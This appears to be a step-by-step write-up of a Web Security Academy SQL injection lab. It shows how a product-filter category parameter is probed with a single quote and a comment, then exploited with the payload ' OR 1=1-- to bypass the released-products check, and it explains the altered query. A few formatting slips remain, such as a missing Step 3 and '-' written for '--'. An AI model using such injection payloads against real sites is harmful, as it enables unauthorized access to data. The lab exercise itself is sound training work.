# Step 1: Browse the Lab

1. Browse the lab.
2. Click any product category (for example, **Gifts**).
3. Find a request at the top similar to:

```
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category=Gifts**
```

---
<img width="1280" height="656" alt="Screenshot 2026-08-01 at 9 39 39 AM" src="https://github.com/user-attachments/assets/582df435-fbe1-48ad-8071-607b94ed9adb" />

# Step 2: Modify the Category Parameter

Replace the category value with:

```sql
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category='**
```

Shows **Internal Server Error**

Next:

```
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category='--**
```

---

No **Internal Server Error**

# 

---
<img width="1281" height="656" alt="Screenshot 2026-08-01 at 9 39 57 AM" src="https://github.com/user-attachments/assets/64007e5b-a4dc-43be-9f7e-3e9fc8fa0f3a" />


# Step 4: After the Injection

Your payload:

```sql
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category='** **OR 1=1--**
```

changes the SQL into something similar to:

```sql
SELECT *
FROM products
WHERE category=''
OR 1=1
--'
AND released=1;
```

Notice what happens:

- The `'` closes the original string.
- `OR 1=1` adds a condition that is **always true**.
- `-` comments out the remainder of the query, so the `AND released=1` check is ignored.

The database effectively executes:

```sql
SELECT *
FROM products
WHERE category=''
OR 1=1;
```

---
<img width="1280" height="656" alt="Screenshot 2026-08-01 at 9 43 46 AM" src="https://github.com/user-attachments/assets/349280d8-497d-4450-b508-e963418a6bd6" />


